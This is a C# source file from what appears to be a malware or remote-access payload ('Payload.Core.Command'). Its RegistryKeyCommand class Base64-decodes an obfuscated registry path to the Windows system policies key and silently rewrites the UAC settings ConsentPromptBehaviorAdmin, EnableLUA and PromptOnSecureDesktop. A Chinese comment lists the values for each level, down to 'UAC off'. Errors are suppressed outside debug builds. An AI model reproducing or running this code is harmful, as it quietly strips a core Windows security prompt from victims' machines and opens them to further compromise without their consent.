using Microsoft.Win32;
using CommonClassLibrary;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.AccessControl;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using static CommonClassLibrary.Config;
/*
1. UAC高
ConsentPromptBehaviorAdmin：2
EnableLUA：1
PromptOnSecureDesktop：1
2. UAC中
ConsentPromptBehaviorAdmin：5
EnableLUA：1
PromptOnSecureDesktop：1
3. UAC低
ConsentPromptBehaviorAdmin：5
EnableLUA：1
PromptOnSecureDesktop：0
4. UAC關閉
ConsentPromptBehaviorAdmin：0
EnableLUA：1
PromptOnSecureDesktop：0
*/
namespace Payload.Core.Command
{
    public class RegistryKeyCommand : IUacCommand
    {
        public override Task Execute()
        {
            try
            {
                OldCall();
            }
            catch(Exception ex) 
            {
#if DEBUG
                Console.WriteLine(ex.ToString());
#endif
            }
            
            return null;
        }

        void OldCall()
        {
            string key = @"U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVt";
            key = TextHelper.Base64Decode(key);
            var rs = new RegistrySecurity();
            RegistryKey uac = Registry.LocalMachine.CreateSubKey(key, RegistryKeyPermissionCheck.ReadWriteSubTree, rs);
            if (uac == null)
                uac = Registry.LocalMachine.CreateSubKey(key);

            uac.SetValue(UacConifg.ConsentPromptBehaviorAdmin_Name, UacConifg.GetUacConfig(UacLevel, UacConifg.ConsentPromptBehaviorAdmin_Name));
            uac.SetValue(UacConifg.EnableLUA_Name, UacConifg.GetUacConfig(UacLevel, UacConifg.EnableLUA_Name));
            uac.SetValue(UacConifg.PromptOnSecureDesktop_Name, UacConifg.GetUacConfig(UacLevel, UacConifg.PromptOnSecureDesktop_Name));

            uac.Close();
        }
    }
}
